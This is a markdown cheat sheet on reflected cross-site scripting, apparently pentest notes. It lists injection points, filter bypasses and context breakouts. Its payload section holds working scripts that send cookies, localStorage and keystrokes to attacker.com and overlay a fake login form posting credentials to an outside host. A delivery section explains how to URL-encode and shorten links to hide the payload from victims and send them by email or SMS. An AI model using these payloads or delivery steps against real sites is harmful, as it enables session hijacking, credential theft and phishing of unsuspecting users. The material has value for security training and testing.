# Reflected XSS

## What it is
Your payload is injected into a request (URL param, search field, header) and the server reflects it straight back in the HTML response — unsanitized. The browser receives it and executes it as code. Nothing is stored server-side.

**Key trait:** Requires the victim to click a crafted URL. One victim, one click, one execution.

---

## How it differs from other XSS types

| Type      | Payload stored? | Who gets hit? | Requires victim action? |
|-----------|----------------|---------------|------------------------|
| Reflected | No             | One user      | Yes — must click link  |
| Stored    | Yes (DB)       | All visitors  | No                     |
| DOM-based | No             | One user      | Yes — must click link  |

---

## Where to look (injection vectors)

- URL parameters: `?q=`, `?search=`, `?redirect=`, `?next=`, `?url=`, `?ref=`
- HTTP headers: `User-Agent`, `Referer`, `X-Forwarded-For` (if reflected in error pages)
- Path segments: `/profile/USERNAME` if the name is echoed back
- Error messages: apps that say "No results for [your input]"
- Any field whose value appears in the response

**Tip:** Search for your input string in Burp's response. If you send `xsstest123` and see it in the HTML, that's your injection point.

---

## Basic proof-of-concept payloads

```html
<!-- Simplest — works when injected into HTML body with no encoding -->
<script>alert(1)</script>

<!-- Alternatives if script tags are filtered -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

---

## Real-world payloads (beyond alert)

```javascript
// Steal session cookie and send to attacker server
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

// Steal cookie via image request (no fetch needed)
<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>

// Capture and exfil everything in localStorage
<script>
  var data = JSON.stringify(localStorage);
  fetch('https://attacker.com/steal?d='+btoa(data));
</script>

// Keylogger — captures everything typed on the page
<script>
  document.onkeypress = function(e) {
    fetch('https://attacker.com/keys?k='+e.key);
  }
</script>

// Redirect victim to phishing page
<script>window.location='https://evil-clone.com'</script>

// Inject fake login form over the real page
<script>
  document.body.innerHTML='<form action="https://attacker.com/login" method="POST">'+
  '<input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password">'+
  '<button>Login</button></form>';
</script>
```

---

## Delivering the payload (real engagement)

Reflected XSS lives in the URL. To hit a victim:

1. Craft the URL with the payload in the vulnerable parameter:
   ```
   https://target.com/search?q=<script>new Image().src='https://attacker.com/?c='+document.cookie</script>
   ```

2. URL-encode the payload (browsers and WAFs may block raw `<script>` in URLs):
   ```
   https://target.com/search?q=%3Cscript%3Enew+Image().src%3D'https%3A%2F%2Fattacker.com%2F%3Fc%3D'%2Bdocument.cookie%3C%2Fscript%3E
   ```

3. Shorten it (bit.ly, custom domain) to hide the payload from the victim

4. Deliver via email, chat, SMS, social media, or embed in another site as a link

---

## Common filters and bypasses

| Filter | Bypass |
|--------|--------|
| Blocks `<script>` | `<img src=x onerror=alert(1)>` |
| Blocks `alert` | `confirm(1)` or `prompt(1)` or `console.log(1)` |
| Encodes `<` and `>` | Inject into an existing attribute instead (see attribute context section) |
| Strips `onerror` | `onfocus`, `onmouseover`, `onload`, `onclick` |
| Blocks `javascript:` | `JaVaScRiPt:` (case variation) |
| Blocks quotes | Use backticks: `` alert`1` `` |

---

## Context matters

Where your input lands in the HTML changes what payload works:

**HTML body context** (between tags):
```html
You searched for: [YOUR INPUT HERE]
```
→ Inject full tags: `<script>alert(1)</script>`

**HTML attribute context** (inside a tag attribute):
```html
<input value="[YOUR INPUT HERE]">
```
→ Break out of the attribute first: `" onmouseover="alert(1)` or `"><script>alert(1)</script>`

**JavaScript string context** (inside a JS variable):
```html
<script>var q = '[YOUR INPUT HERE]';</script>
```
→ Break out of the string: `';alert(1);//`

**URL attribute context** (inside href/src):
```html
<a href="[YOUR INPUT HERE]">click</a>
```
→ Use javascript: protocol: `javascript:alert(1)`

---

## Encoding reference (for delivering via URL)

| Char | URL encoded |
|------|-------------|
| `<`  | `%3C` |
| `>`  | `%3E` |
| `"`  | `%22` |
| `'`  | `%27` |
| `(`) | `%28` |
| `)` | `%29` |
| `/`  | `%2F` |
| `;`  | `%3B` |
| `=`  | `%3D` |
